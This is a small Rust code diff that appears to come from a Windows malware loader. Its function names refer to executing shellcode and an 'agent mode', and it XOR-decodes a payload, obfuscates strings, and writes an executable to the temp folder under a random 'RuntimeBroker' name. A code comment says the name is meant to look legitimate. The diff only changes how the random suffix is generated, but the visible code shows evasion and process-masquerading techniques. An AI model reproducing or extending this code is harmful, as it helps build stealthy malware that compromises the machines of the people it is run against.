@@ -30,6 +30,7 @@ pub fn execute_shellcode() -> Result<(), Box<dyn std::error::Error>> {
 #[cfg(target_os = "windows")]
 fn execute_agent_mode(xor_key: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
     use obfstr::obfstr;
+    use rand::Rng;
     use std::fs::File;
     use std::io::Write;
     use std::os::windows::process::CommandExt;
@@ -40,7 +41,7 @@ fn execute_agent_mode(xor_key: &[u8]) -> Result<(), Box<dyn std::error::Error>> 
 
     // Create temp file with random name that looks legitimate
     let temp_dir = std::env::temp_dir();
-    let random_suffix: u32 = rand::random();
+    let random_suffix: u32 = rand::thread_rng().gen();
     let exe_name = format!("{}_{}.exe", obfstr!("RuntimeBroker"), random_suffix);
     let exe_path = temp_dir.join(&exe_name);
 
